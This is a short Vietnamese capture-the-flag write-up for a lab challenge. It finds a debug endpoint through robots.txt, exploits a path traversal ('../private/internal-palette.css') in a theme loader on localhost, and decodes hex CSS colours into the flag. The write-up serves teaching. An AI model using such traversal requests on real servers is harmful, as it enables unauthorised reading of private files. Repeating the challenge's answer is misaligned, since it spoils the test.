# CSS Color Encoding - Writeup

## 1. Khảo sát

Trang chính là một palette preview bình thường. CSS được load từ:

```text
/theme?file=default.css
```

Kiểm tra `robots.txt`:

```bash
curl http://127.0.0.1:8082/robots.txt
```

Thấy endpoint debug:

```text
Disallow: /debug/
```

## 2. Tìm đường dẫn palette nội bộ

Gọi debug endpoint:

```bash
curl "http://127.0.0.1:8082/debug/theme?name=internal"
```

Response tiết lộ:

```text
../private/internal-palette.css
```

Đồng thời note cho biết legacy loader vẫn nhận filename tương đối.

## 3. Khai thác path traversal trong theme loader

Endpoint `/theme` join path trực tiếp với tham số `file`, nên có thể đọc file ngoài thư mục theme:

```bash
curl "http://127.0.0.1:8082/theme?file=../private/internal-palette.css"
```

Nội dung trả về là CSS chứa nhiều class:

```css
.swatch-00 { --ink: #620000; }
.swatch-01 { --ink: #6c0000; }
```

## 4. Decode CSS color

Mỗi màu có dạng:

```text
#xx0000
```

Lấy byte `xx`, đổi từ hex sang ASCII:

```text
62 6c 6f 63 6b ...
```

Kết quả:

```text
blockChainPTIT{css_palette_lfi}
```

Flag:

```text
blockChainPTIT{css_palette_lfi}
```
